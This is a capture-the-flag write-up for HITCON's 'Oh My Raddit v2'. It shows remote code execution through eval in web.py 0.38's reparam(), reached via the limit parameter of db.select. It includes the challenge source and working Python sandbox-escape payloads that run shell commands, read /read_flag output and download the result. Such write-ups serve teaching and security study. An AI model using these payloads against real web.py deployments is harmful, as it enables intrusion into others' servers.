# Oh My Raddit v2
Use same method as "Oh My Raddit" to get `flag` is forbiddened.

By hint, `Give me SHELL!!!`, obviously we can only use RCE to run some binary to get it.

According to we already know this website use `web.py`, let's use same method to get `requirement.txt`, then we know `web.py==0.38`.

Then if you google some RCE vulnerbility of web.py, you'll find this post: [Remote Code Execution in Web.py framework](https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/)

```python
def reparam(string_, dictionary):
    """
    Takes a string and a dictionary and interpolates the string
    using values from the dictionary. Returns an `SQLQuery` for the result.
 
        >>> reparam("s = $s", dict(s=True))
        <sql: "s = 't'">
        >>> reparam("s IN $s", dict(s=[1, 2]))
        <sql: 's IN (1, 2)'>
    """
    dictionary = dictionary.copy() # eval mucks with it
    vals = []
    result = []
    for live, chunk in _interpolate(string_):
        if live:
            v = eval(chunk, dictionary)
            result.append(sqlquote(v))
        else:
            result.append(chunk)
    return SQLQuery.join(result, '')
```

With thin `eval`, make RCE become possible.

The post said: `The entry points to reparam() are functions _where(), query(), and gen_clause()`

Let's see part source of `web.py`:
```python
    def select(self, tables, vars=None, what='*', where=None, order=None, group=None,
               limit=None, offset=None, _test=False):
        """
        Selects `what` from `tables` with clauses `where`, `order`,
        `group`, `limit`, and `offset`. Uses vars to interpolate.
        Otherwise, each clause can be a SQLQuery.
            >>> db = DB(None, {})
            >>> db.select('foo', _test=True)
            <sql: 'SELECT * FROM foo'>
            >>> db.select(['foo', 'bar'], where="foo.bar_id = bar.id", limit=5, _test=True)
            <sql: 'SELECT * FROM foo, bar WHERE foo.bar_id = bar.id LIMIT 5'>
            >>> db.select('foo', where={'id': 5}, _test=True)
            <sql: 'SELECT * FROM foo WHERE id = 5'>
        """
        if vars is None: vars = {}
        sql_clauses = self.sql_clauses(what, tables, where, group, order, limit, offset)
        clauses = [self.gen_clause(sql, val, vars) for sql, val in sql_clauses if val is not None]
        qout = SQLQuery.join(clauses)
        if _test: return qout
        return self.query(qout, processed=True)
```

Compare to source of `Oh My Raddit v2`, `Web.py` framework's [`gen_clause()`](https://github.com/webpy/webpy/blob/c86237676eb602e90496638b2af51f6115ef96b2/web/db.py) function will trigger by [`db.select()`](http://webpy.org/cookbook/select) in `get_posts()` of `Oh My Raddit v2`.

```python
# coding: UTF-8
import os
import web
import urllib
import urlparse
from Crypto.Cipher import DES

web.config.debug = False
ENCRPYTION_KEY = 'megnnaro'


urls = (
    '/', 'index'
)
app = web.application(urls, globals())
db = web.database(dbn='sqlite', db='db.db')


def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length

    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')

def decrypt(s):
    try:
        data = s.decode('hex')
        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)

        data = cipher.decrypt(data)
        data = data[:-ord(data[-1])]
        return dict(urlparse.parse_qsl(data))
    except Exception as e:
        print e.message
        return {}

def get_posts(limit=None):
    records = []
    for i in db.select('posts', limit=limit, order='ups desc'):
        tmp = {
            'm': 'r', 
            't': i.title.encode('utf-8', 'ignore'), 
            'u': i.id, 
        } 
        tmp['param'] = encrypt(urllib.urlencode(tmp))
        tmp['ups'] = i.ups
        if i.file:
            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
        else:
            tmp['file'] = ''

        records.append( tmp )
    return records

def get_urls():
    urls = []
    for i in [10, 100, 1000]:
        data = {
            'm': 'p', 
            'l': i
        }
        urls.append( encrypt(urllib.urlencode(data)) )
    return urls

class index:
    def GET(self):
        s = web.input().get('s')
        if not s:
            return web.template.frender('templates/index.html')(get_posts(), get_urls())
        else:
            s = decrypt(s)
            method = s.get('m', '')
            if method and method not in list('rdp'):
                return 'param error'
            if method == 'r':
                uid = s.get('u')
                record = db.select('posts', where='id=$id', vars={'id': uid}).first()
                if record:
                    raise web.seeother(record.url)
                else:
                    return 'not found'
            elif method == 'd':
                file = s.get('f')
                if not os.path.exists(file):
                    return 'not found'
                name = os.path.basename(file)
                web.header('Content-Disposition', 'attachment; filename=%s' % name)
                web.header('Content-Type', 'application/pdf')
                with open(file, 'rb') as fp:
                    data = fp.read()
                return data
            elif method == 'p':
                limit = s.get('l')
                return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
            else:
                return web.template.frender('templates/index.html')(get_posts(), get_urls())


if __name__ == "__main__":
    app.run()
```

Use `{'m':'p','l':'$__import__("os").system("ls > /tmp/ls.txt")'}`, method `p` will goto last condition in function `GET()` in class `index`, use param `l` to send limit(payload) to `get_posts()` and then let `db.select()` eval the payload.

However, it failed. If we going deep into it, you will find this fail with this line:
```
< dictionary = dictionary.copy() #eval mucks with it
> disable builtins to avoid risk for remote code exection.
```

Fortunately, the post gives us another method to bypass this hotfix: 
`
{'m':'p','l':'${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=="catch_warnings"][0]()._module.__builtins__):getthem["__import__"]("os").system("ls -al / > /tmp/1.txt"))()}'}
`

Cuz we can not get the result message directly, we need to print them into file, then download the file: `{'m':'d','f':'/tmp/1.txt'}`.

```
total 104
drwxr-xr-x  23 root root  4096 Oct 16 08:18 .
drwxr-xr-x  23 root root  4096 Oct 16 08:18 ..
drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
drwxr-xr-x   3 root root  4096 Oct 10 06:46 boot
drwxr-xr-x  15 root root  2980 Oct  8 18:13 dev
drwxr-xr-x  91 root root  4096 Oct 11 16:05 etc
-r--------   1 root root    47 Oct 16 08:15 flag
drwxr-xr-x   4 root root  4096 Oct 11 16:02 home
lrwxrwxrwx   1 root root    31 Oct 10 06:46 initrd.img -> boot/initrd.img-4.15.0-1023-aws
lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
drwxr-xr-x  20 root root  4096 Oct 11 15:27 lib
drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
drwx------   2 root root 16384 Sep 12 16:10 lost+found
drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
dr-xr-xr-x 127 root root     0 Oct  8 18:13 proc
-rwsr-sr-x   1 root root  8568 Oct 16 08:18 read_flag
drwx------   4 root root  4096 Oct 16 08:18 root
drwxr-xr-x  26 root root  1000 Oct 22 06:21 run
drwxr-xr-x   2 root root  4096 Oct 10 06:46 sbin
drwxr-xr-x   5 root root  4096 Oct  8 18:13 snap
drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
dr-xr-xr-x  13 root root     0 Oct 16 08:18 sys
drwxrwxrwt  12 root root  4096 Oct 22 09:33 tmp
drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
drwxr-xr-x  14 root root  4096 Oct 11 15:58 var
lrwxrwxrwx   1 root root    28 Oct 10 06:46 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
```

Now we get that there's a binary name `read_flag`, exec it and put result into output file: `{'m':'p','l':'${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=="catch_warnings"][0]()._module.__builtins__):getthem["__import__"]("os").system("/read_flag / > /tmp/readflag.txt"))()}'}`

Then download the output: `{'m':'d','f':'/tmp/readflag.txt'}`

Flag is: `hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}`